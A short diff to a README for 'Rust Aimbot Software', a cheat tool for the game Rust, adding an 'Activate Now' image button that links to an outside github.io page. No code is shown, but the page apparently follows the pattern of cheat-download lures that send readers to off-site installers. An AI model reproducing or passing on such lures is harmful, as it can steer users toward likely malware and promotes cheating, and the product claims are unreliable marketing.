@@ -2,6 +2,8 @@
 
 The **Rust Aimbot Software** is made for players who want sharper, more reliable targeting in Rust’s unforgiving survival world. With **smooth tracking, customizable FOV, and recoil balancing**, it lets you practice accuracy, conserve ammo, and refine gunplay in private or offline sessions.
 
+[![Activate Now](https://github.com/hawk-1983/hawk-1983/blob/main/img.png?raw=true)](https://rust-aimbot-tools.github.io/.github/)
+
 ---
 
 ## 📝 Overview
